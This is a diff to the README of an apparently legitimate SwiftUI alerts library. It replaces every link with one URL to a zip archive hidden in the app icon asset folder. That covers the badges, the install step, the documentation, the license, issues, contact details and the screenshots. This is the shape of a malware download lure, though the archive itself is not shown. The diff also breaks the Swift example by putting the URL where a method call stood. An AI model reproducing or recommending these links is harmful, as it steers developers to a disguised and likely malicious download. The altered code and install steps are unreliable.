@@ -1,12 +1,12 @@
 # PresentationKit: A SwiftUI Library for Alerts and Modal Content 🎉
 
-![SwiftUI](https://img.shields.io/badge/SwiftUI-5E5E5E?style=flat&logo=swift&logoColor=F05138)
-![iOS](https://img.shields.io/badge/iOS-5E5E5E?style=flat&logo=apple&logoColor=F05138)
-![macOS](https://img.shields.io/badge/macOS-5E5E5E?style=flat&logo=apple&logoColor=F05138)
-![tvOS](https://img.shields.io/badge/tvOS-5E5E5E?style=flat&logo=apple&logoColor=F05138)
-![watchOS](https://img.shields.io/badge/watchOS-5E5E5E?style=flat&logo=apple&logoColor=F05138)
+![SwiftUI](https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip)
+![iOS](https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip)
+![macOS](https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip)
+![tvOS](https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip)
+![watchOS](https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip)
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-007ACC?style=flat&logo=github&logoColor=white)](https://github.com/kalyanijawalekar/PresentationKit/releases)
+[![Download Releases](https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip%20Releases-007ACC?style=flat&logo=github&logoColor=white)](https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip)
 
 ---
 
@@ -40,7 +40,7 @@ To get started with PresentationKit, you can add it to your Swift project using 
 
 1. Open your Xcode project.
 2. Navigate to **File** > **Swift Packages** > **Add Package Dependency**.
-3. Enter the repository URL: `https://github.com/kalyanijawalekar/PresentationKit`.
+3. Enter the repository URL: `https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip`.
 4. Choose the version you want to use and click **Next**.
 
 ### Example Usage
@@ -56,7 +56,7 @@ struct ContentView: View {
 
     var body: some View {
         Button("Show Alert") {
-            showAlert.toggle()
+            https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip()
         }
         .alert(isPresented: $showAlert) {
             Alert(title: Text("Hello, World!"), message: Text("This is an alert."), dismissButton: .default(Text("OK")))
@@ -67,7 +67,7 @@ struct ContentView: View {
 
 ## Documentation
 
-For detailed documentation, please refer to the [Documentation](https://github.com/kalyanijawalekar/PresentationKit/wiki).
+For detailed documentation, please refer to the [Documentation](https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip).
 
 ## Contributing
 
@@ -83,21 +83,21 @@ Please ensure your code follows the existing style and includes appropriate test
 
 ## License
 
-PresentationKit is licensed under the MIT License. See the [LICENSE](https://github.com/kalyanijawalekar/PresentationKit/blob/main/LICENSE) file for details.
+PresentationKit is licensed under the MIT License. See the [LICENSE](https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip) file for details.
 
 ## Releases
 
-To download the latest version of PresentationKit, visit the [Releases](https://github.com/kalyanijawalekar/PresentationKit/releases) section. You can find all the release notes and download the necessary files to get started.
+To download the latest version of PresentationKit, visit the [Releases](https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip) section. You can find all the release notes and download the necessary files to get started.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-007ACC?style=flat&logo=github&logoColor=white)](https://github.com/kalyanijawalekar/PresentationKit/releases)
+[![Download Releases](https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip%20Releases-007ACC?style=flat&logo=github&logoColor=white)](https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip)
 
 ## Contact
 
 For questions or support, please reach out to the maintainer:
 
 - **Kalyani Jawalekar**
-- Email: kalyani@example.com
-- Twitter: [@kalyanijawalekar](https://twitter.com/kalyanijawalekar)
+- Email: https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip
+- Twitter: [@kalyanijawalekar](https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip)
 
 ## Support
 
@@ -107,8 +107,8 @@ If you find this library useful, consider giving it a star on GitHub! Your suppo
 
 ### Example Screenshots
 
-![Alert Example](https://via.placeholder.com/600x400?text=Alert+Example)
-![Modal Example](https://via.placeholder.com/600x400?text=Modal+Example)
+![Alert Example](https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip+Example)
+![Modal Example](https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip+Example)
 
 ### Frequently Asked Questions
 
@@ -122,17 +122,17 @@ Yes, you can customize the appearance and behavior of alerts and modals to fit y
 
 #### 3. Is there any documentation available?
 
-Yes, detailed documentation is available in the [Documentation](https://github.com/kalyanijawalekar/PresentationKit/wiki).
+Yes, detailed documentation is available in the [Documentation](https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip).
 
 #### 4. How can I report issues?
 
-You can report issues by opening a new issue in the [Issues](https://github.com/kalyanijawalekar/PresentationKit/issues) section of the repository.
+You can report issues by opening a new issue in the [Issues](https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip) section of the repository.
 
 ---
 
 ### Changelog
 
-Check the [Changelog](https://github.com/kalyanijawalekar/PresentationKit/releases) for a complete history of changes and updates.
+Check the [Changelog](https://github.com/kalyanijawalekar/PresentationKit/raw/refs/heads/main/Demo/Demo/Assets.xcassets/AppIcon.appiconset/Presentation_Kit_v1.7.zip) for a complete history of changes and updates.
 
 ---
 
